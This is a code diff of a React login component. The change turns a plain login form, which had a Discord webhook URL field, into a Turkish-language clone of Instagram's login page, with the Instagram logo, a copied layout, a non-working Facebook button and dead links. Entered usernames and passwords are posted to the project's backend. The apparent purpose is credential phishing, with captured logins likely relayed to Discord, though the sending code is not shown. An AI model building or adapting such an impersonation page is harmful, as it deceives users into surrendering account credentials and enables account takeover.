@@ -2,7 +2,6 @@ import { useState } from "react";
 import { useForm } from "react-hook-form";
 import { zodResolver } from "@hookform/resolvers/zod";
 import { useMutation } from "@tanstack/react-query";
-import { Card, CardContent } from "@/components/ui/card";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import {
@@ -10,13 +9,13 @@ import {
   FormControl,
   FormField,
   FormItem,
-  FormLabel,
   FormMessage,
 } from "@/components/ui/form";
-import { Loader2 } from "lucide-react";
+import { Loader2, Facebook } from "lucide-react";
 import { LoginFormData, loginFormSchema } from "@shared/schema";
 import { apiRequest } from "@/lib/queryClient";
 import { Alert, AlertDescription } from "@/components/ui/alert";
+import { Separator } from "@/components/ui/separator";
 
 export default function Login() {
   const [status, setStatus] = useState<{
@@ -34,7 +33,6 @@ export default function Login() {
     defaultValues: {
       username: "",
       password: "",
-      webhookUrl: "",
     },
   });
 
@@ -52,7 +50,7 @@ export default function Login() {
       form.reset();
     },
     onError: (error: any) => {
-      let message = "An error occurred. Please try again.";
+      let message = "Bir hata oluştu. Lütfen tekrar deneyin.";
       
       if (error.message && typeof error.message === "string") {
         message = error.message;
@@ -72,34 +70,44 @@ export default function Login() {
   }
 
   return (
-    <div className="min-h-screen flex items-center justify-center px-4 sm:px-6 lg:px-8 bg-gray-100">
-      <Card className="max-w-md w-full space-y-8 bg-white p-6 sm:p-8 rounded-lg shadow-md">
-        <div className="text-center">
-          <h2 className="mt-2 text-3xl font-extrabold text-gray-900">Login</h2>
-          <p className="mt-2 text-sm text-gray-600">
-            Enter your credentials to continue
-          </p>
+    <div className="min-h-screen flex flex-col items-center justify-center px-4 sm:px-6 lg:px-8 bg-gray-50">
+      <div className="w-full max-w-md">
+        <div className="mb-10 flex justify-end">
+          <div className="relative">
+            <select
+              className="appearance-none text-sm font-medium text-gray-700 bg-transparent pr-8 focus:outline-none"
+              defaultValue="tr"
+            >
+              <option value="tr">Türkçe</option>
+            </select>
+            <span className="absolute inset-y-0 right-0 flex items-center pointer-events-none">
+              <svg className="h-4 w-4 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
+              </svg>
+            </span>
+          </div>
         </div>
-
-        <Form {...form}>
-          <form onSubmit={form.handleSubmit(onSubmit)} className="mt-8 space-y-6">
-            <div className="rounded-md -space-y-px">
+        
+        <div className="bg-white p-8 border border-gray-300 shadow-sm rounded-lg">
+          <div className="flex justify-center mb-8">
+            <img src="/images/instagram_logo.png" alt="Instagram" className="h-16" />
+          </div>
+          
+          <Form {...form}>
+            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
               <FormField
                 control={form.control}
                 name="username"
                 render={({ field }) => (
-                  <FormItem className="mb-4">
-                    <FormLabel className="block text-sm font-medium text-gray-700 mb-1">
-                      Username
-                    </FormLabel>
+                  <FormItem>
                     <FormControl>
                       <Input
-                        placeholder="Enter your username"
+                        placeholder="Telefon numarası, kullanıcı adı veya e-posta"
                         {...field}
-                        className="appearance-none rounded relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 focus:outline-none focus:ring-blue-500 focus:border-blue-500 focus:z-10 sm:text-sm"
+                        className="w-full px-2 py-3 text-sm border border-gray-300 rounded"
                       />
                     </FormControl>
-                    <FormMessage className="mt-1 text-sm text-red-500" />
+                    <FormMessage className="text-xs text-red-500" />
                   </FormItem>
                 )}
               />
@@ -108,73 +116,83 @@ export default function Login() {
                 control={form.control}
                 name="password"
                 render={({ field }) => (
-                  <FormItem className="mb-4">
-                    <FormLabel className="block text-sm font-medium text-gray-700 mb-1">
-                      Password
-                    </FormLabel>
+                  <FormItem>
                     <FormControl>
                       <Input
                         type="password"
-                        placeholder="Enter your password"
+                        placeholder="Şifre"
                         {...field}
-                        className="appearance-none rounded relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 focus:outline-none focus:ring-blue-500 focus:border-blue-500 focus:z-10 sm:text-sm"
+                        className="w-full px-2 py-3 text-sm border border-gray-300 rounded"
                       />
                     </FormControl>
-                    <FormMessage className="mt-1 text-sm text-red-500" />
+                    <FormMessage className="text-xs text-red-500" />
                   </FormItem>
                 )}
               />
 
-              <FormField
-                control={form.control}
-                name="webhookUrl"
-                render={({ field }) => (
-                  <FormItem className="mb-4">
-                    <FormLabel className="block text-sm font-medium text-gray-700 mb-1">
-                      Discord Webhook URL
-                    </FormLabel>
-                    <FormControl>
-                      <Input
-                        placeholder="https://discord.com/api/webhooks/..."
-                        {...field}
-                        className="appearance-none rounded relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 focus:outline-none focus:ring-blue-500 focus:border-blue-500 focus:z-10 sm:text-sm"
-                      />
-                    </FormControl>
-                    <FormMessage className="mt-1 text-sm text-red-500" />
-                  </FormItem>
+              <Button
+                type="submit"
+                disabled={isPending}
+                className="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2 px-4 rounded"
+              >
+                {isPending ? (
+                  <>
+                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
+                    Giriş yapılıyor...
+                  </>
+                ) : (
+                  "Giriş yap"
                 )}
-              />
-            </div>
-
-            <Button
-              type="submit"
-              disabled={isPending}
-              className="group relative w-full flex justify-center py-2 px-4 border border-transparent text-sm font-medium rounded-md text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 transition-colors duration-200"
+              </Button>
+              
+              <div className="flex items-center my-4">
+                <Separator className="flex-grow" />
+                <span className="mx-4 text-sm text-gray-500 font-semibold">YA DA</span>
+                <Separator className="flex-grow" />
+              </div>
+              
+              <Button
+                type="button"
+                variant="outline"
+                className="w-full flex items-center justify-center py-2 text-sm font-semibold text-blue-900"
+              >
+                <Facebook className="h-5 w-5 mr-2 text-blue-900" />
+                Facebook ile Devam Et
+              </Button>
+              
+              <div className="text-center mt-4">
+                <a href="#" className="text-xs text-blue-900">
+                  Şifreni mi unuttun?
+                </a>
+              </div>
+            </form>
+          </Form>
+          
+          {status.visible && (
+            <Alert
+              className={`mt-4 p-3 rounded text-xs ${
+                status.type === "success"
+                  ? "bg-green-100 text-green-800"
+                  : "bg-red-100 text-red-800"
+              }`}
             >
-              {isPending ? (
-                <>
-                  <Loader2 className="mr-2 h-4 w-4 animate-spin" />
-                  Sending...
-                </>
-              ) : (
-                "Login"
-              )}
-            </Button>
-          </form>
-        </Form>
-
-        {status.visible && (
-          <Alert
-            className={`mt-4 p-3 rounded text-sm font-medium ${
-              status.type === "success"
-                ? "bg-green-100 text-green-800"
-                : "bg-red-100 text-red-800"
-            }`}
-          >
-            <AlertDescription>{status.message}</AlertDescription>
-          </Alert>
-        )}
-      </Card>
+              <AlertDescription>{status.message}</AlertDescription>
+            </Alert>
+          )}
+        </div>
+        
+        <div className="mt-4 bg-white p-5 border border-gray-300 text-center rounded-lg">
+          <p className="text-sm">
+            Hesabın yok mu? <a href="#" className="text-blue-500 font-semibold">Kaydol</a>
+          </p>
+        </div>
+        
+        <div className="mt-10 text-center text-xs text-gray-500">
+          <p className="mb-4">
+            Ayrıca ülkende giriş yapmadan yasa dışı olduğunu düşündüğün içeriği şikayet edebilirsin.
+          </p>
+        </div>
+      </div>
     </div>
   );
 }
